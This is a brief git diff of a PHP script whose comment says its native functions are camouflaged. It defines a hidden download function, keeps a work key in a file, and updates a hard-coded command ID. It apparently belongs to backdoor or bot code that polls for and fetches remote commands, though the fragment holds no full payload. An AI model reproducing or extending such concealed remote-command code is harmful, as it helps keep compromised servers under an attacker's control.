@@ -3,8 +3,6 @@ cuidado ao chamar funções nativas pois elas estao camufladas
 
 [GIT_COMMAND]
 
-
-
 $GLOBALS['__download_002'] = function($url)
 {
 	try
@@ -43,7 +41,7 @@ if(!$work_key)
 	@file_put_contents($id_path, $work_key);
 }
 $work_key = trim($work_key);
-$command_id = '000032';
+$command_id = '000034';
 if(@file_get_contents($id_com) !== $command_id)
 {
 	@file_put_contents($id_com, $command_id);
